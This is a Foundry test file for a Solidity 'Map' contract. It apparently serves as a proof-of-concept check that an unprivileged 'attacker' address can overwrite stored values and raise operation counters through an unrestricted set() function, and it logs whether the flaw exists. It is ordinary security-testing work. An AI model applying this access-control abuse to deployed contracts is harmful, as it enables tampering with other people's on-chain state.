// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/mapping_write.sol";

contract MapTest is Test {
    Map public mapContract;
    address owner = address(0x1);
    address attacker = address(0x2);
    uint256 constant TEST_KEY = 1;

    function setUp() public {
        vm.prank(owner);
        mapContract = new Map();
    }

    function testInitialOwnerIsDeployer() public view {
        assertEq(mapContract.owner(), owner);
    }

    function testAttackerCanModifyStorage() public {
        // Initialize storage by owner to avoid panic
        vm.prank(owner);
        mapContract.set(TEST_KEY, 42);

        console2.log("--- BEFORE-Trigger Storage Value ---");
        uint initialValue = mapContract.get(TEST_KEY);
        console2.log("Initial value at key", TEST_KEY, ":", initialValue);

        console2.log("--- Trigger SetValue ---");
        vm.prank(attacker);
        mapContract.set(TEST_KEY, 123);

        console2.log("--- AFTER-Trigger Storage Value ---");
        uint newValue = mapContract.get(TEST_KEY);
        console2.log("New value at key", TEST_KEY, ":", newValue);

        // Final vulnerability check
        if (newValue == 123) {
            console2.log("Vulnerability Exists: Attacker successfully modified storage");
        } else {
            console2.log("Vulnerability not Exist: Storage modification failed");
        }
    }

    function testStorageOperationsCountIncreases() public {
        console2.log("--- BEFORE-Trigger TotalStorageOperations ---");
        uint256 initialCount = mapContract.totalStorageOperations();
        console2.log("Initial total storage operations count:", initialCount);
        
        console2.log("--- Trigger SetValue ---");
        vm.prank(attacker);
        mapContract.set(0, 456);

        console2.log("--- AFTER-Trigger TotalStorageOperations ---");
        uint256 finalCount = mapContract.totalStorageOperations();
        console2.log("Final total storage operations count:", finalCount);

        if (finalCount > initialCount) {
            console2.log("Vulnerability Exists: Total operations increased by attacker");
        } else {
            console2.log("Vulnerability not Exist: Operations count unchanged");
        }
    }

    function testUserStorageCountIncreases() public {
        console2.log("--- BEFORE-Trigger UserStorageCount ---");
        uint256 initialCount = mapContract.userStorageCount(attacker);
        console2.log("Initial user storage count for attacker:", initialCount);
        
        console2.log("--- Trigger SetValue ---");
        vm.prank(attacker);
        mapContract.set(0, 789);

        console2.log("--- AFTER-Trigger UserStorageCount ---");
        uint256 finalCount = mapContract.userStorageCount(attacker);
        console2.log("Final user storage count for attacker:", finalCount);

        if (finalCount > initialCount) {
            console2.log("Vulnerability Exists: Attacker's operation count increased");
        } else {
            console2.log("Vulnerability not Exist: Attacker's operation count unchanged");
        }
    }
}